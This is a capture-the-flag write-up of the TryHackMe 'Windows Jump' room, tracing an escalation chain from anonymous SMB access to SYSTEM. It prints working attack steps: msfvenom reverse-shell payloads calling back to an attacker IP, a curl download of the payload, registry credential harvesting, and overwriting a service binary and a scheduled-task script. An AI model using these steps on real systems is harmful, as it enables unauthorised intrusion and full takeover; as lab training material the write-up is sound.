Room: [https://tryhackme.com/room/windowsjump](https://tryhackme.com/room/windowsjump)
# Overview

**Windows Jump** is a Windows privilege-escalation challenge built around chaining multiple weaknesses together.

The attack path was:

```
SMB
 ↓
thmuser
 ↓
notadmin
 ↓
svcadmin
 ↓
SYSTEM
```

The main techniques involved:
- SMB enumeration
- Credential discovery
- `runas`
- Service binary hijacking
- `msfvenom` payload generation
- Writable scheduled-task script
- Privilege escalation to `SYSTEM`

---

# 1. Initial Reconnaissance

I started with an Nmap scan against the target.

![nmap%20scan](screenshots/nmap%20scan.png)

I used a relatively high `--min-rate` because the scan was taking too long at the default rate.

The scan showed that **SMB was exposed**, so I moved on to SMB enumeration.

### SMB share enumeration

I used `smbclient` to enumerate the available shares anonymously:
```
smbclient -L //10.113.162.184 -N
```

This revealed several shares, including:
```
ADMIN$
Public
```

The `Public` share was particularly interesting because it was accessible anonymously.

I connected to it:
```
smbclient //10.113.162.184/Public -N
```

After listing the contents, I found:
```
welcome.txt
```

I downloaded and inspected the file. It contained default credentials:
```
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : <password>

Please change your password after first login.
```
These credentials gave me an initial foothold as `thmuser`.

I logged into the machine and obtained:
```
flag1.txt
```

---

# 2. Enumerating User Privileges

Once on the machine, I checked the privileges assigned to the current user:
```
whoami /priv
```

There were no interesting privileges that immediately suggested a direct escalation path.

I then started looking for sensitive configuration files.

---

# 3. Finding `Unattend.xml`

Windows installation and deployment files can sometimes contain credentials or other sensitive configuration information.

I searched the entire `C:\` drive for `Unattend.xml`:
```
where /r C:\ Unattend.xml
```

This returned:
```
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
```

I printed the contents of the file and found information related to administrator password generation.

This wasn't immediately useful for the current privilege-escalation step, but it became relevant later when I obtained access as `svcadmin`.

---

# 4. Finding Credentials for `notadmin`

I uploaded **WinPEAS** to the target and used it for automated Windows privilege-escalation enumeration.

WinPEAS identified credentials for another local user at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
```
notadmin
```

This could've also been found via:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

I used the discovered credentials with Windows' `runas` functionality:
```
runas /user:notadmin cmd
```

After entering the password, I obtained a new command prompt running as `notadmin`.

This gave me access to:
```
flag2.txt
```

---

# 5. `notadmin` → `svcadmin`: Service Binary Hijacking

I enumerated Windows services and found an interesting service:
```
THMSvc              .\svcadmin       C:\Windows\THMSVC\svc.exe
```

This showed that:
- The service was named `THMSvc`.
- It executed `svc.exe`.
- The service ran as `svcadmin`.

The important question was whether I could modify the executable being executed by the service.

Checking its permissions showed:
```
Everyone:(F)                                                     PRIVESC\notadmin:(I)(F)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```
`notadmin` therefore had **Full Control** over `svc.exe`.

This created a classic **service binary hijacking** opportunity.

Instead of the legitimate `svc.exe`, I could replace it with a malicious executable. When the service started, Windows would execute my replacement using the service account's privileges.

### Generating the payload

I generated a Windows service-compatible reverse-shell executable with `msfvenom`:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.192.32 LPORT=4444 -f exe-service -o svc.exe
```

The important part here is:
```
-f exe-service
```
This generates an executable suitable for use as a Windows service binary.

I then hosted the payload using a simple Python HTTP server:
```
python3 -m http.server 8000
```

From the target, I downloaded the malicious executable:
```
curl -o svc.exe http://192.168.192.32:8000/svc.exe
```

I also explicitly granted full permissions:
```
icacls svc.exe /grant Everyone:F
```

Then I started the vulnerable service:
```
svc start THMSvc
```

Because `THMSvc` executes `svc.exe` as `svcadmin`, my replacement executable ran with `svcadmin`'s privileges.

I caught the resulting reverse shell and obtained access as:
```
svcadmin
```

This allowed me to retrieve:
```
flag3.txt
```

---

# 6. `svcadmin` → SYSTEM

Now that I was `svcadmin`, I returned to the `Unattend.xml` file discovered earlier.

The file pointed toward a random password generation mechanism. However, the relevant file wasn't writable, meaning I couldn't modify the password-generation logic.

Therefore, this path wasn't useful for escalating further.

I continued enumerating the system for writable files and scheduled tasks.

---

# 7. Finding the Writable `cleanup.bat`

I inspected:
```
C:\Windows\Tasks
```

Inside, I found:
```
cleanup.bat
```

Scheduled-task scripts are particularly interesting during Windows privilege escalation because they may execute automatically under a more privileged account.

I checked its permissions:
```
icacls cleanup.bat
```

The result was:
```
cleanup.bat BUILTIN\Users:(I)(RX)                                 
            PRIVESC\svcadmin:(I)(M)                               
            BUILTIN\Administrators:(I)(F)                         
            NT AUTHORITY\SYSTEM:(I)(F)
```

`(M)` means **Modify**.

Therefore, `svcadmin` could modify `cleanup.bat`.

If the scheduled task executed this script as `SYSTEM`, modifying it would allow arbitrary commands to execute with SYSTEM privileges.

---

# 8. Creating the SYSTEM Reverse Shell

I generated another reverse-shell payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.192.32 LPORT=5555 -f exe -o shell.exe
```

I then served `shell.exe` and downloaded it from the existing `svcadmin` reverse shell.

With the payload on the target, I modified the scheduled-task script:
```
echo "C:\Windows\Tasks\shell.exe" > C:\Windows\Tasks\cleanup.bat
```

This overwrote `cleanup.bat` so that its contents simply executed my payload:
```
C:\Windows\Tasks\shell.exe
```

The next time the scheduled task executed `cleanup.bat`, it launched my reverse shell.

---

# 9. SYSTEM

I checked the identity of the new shell:
```
whoami
```

The result showed:
```
nt authority\system
```

Finally, I read:
```
flag4.txt
```

---

# Attack Chain

The complete escalation chain was:
```
Anonymous SMB
    ↓
Public share
    ↓
Default credentials
    ↓
thmuser
    ↓
WinPEAS
    ↓
notadmin
    ↓
Writable svc.exe
    ↓
THMSvc service binary hijacking
    ↓
svcadmin
    ↓
Writable cleanup.bat
    ↓
Scheduled task
    ↓
SYSTEM
```

## Key Takeaways

### 1. Anonymous SMB access can expose credentials

### 2. Always inspect service binaries and their permissions
```
Writable executable
        +
Service executes it
        +
Service runs as privileged user
        =
Service binary hijacking
```

### 3. Scheduled-task scripts are worth checking
```
Writable script
      +
Privileged scheduled task
      =
Privilege escalation
```

### 4. Enumeration findings can become useful later

The `Unattend.xml` discovery didn't immediately produce an escalation path. However, keeping track of interesting files matters because their relevance can change after obtaining a different account.

### 5. Triggers aren't always required

If I can modify a file run by a privileged task or cron job, I may not need to identify its exact trigger. Replace its contents, start a listener, and wait.

### 6. Payload Can Be Separate

The file also does not need to contain the full payload. For example, `cleanup.bat` can launch the controlled `shell.exe` instead of having the commands itself.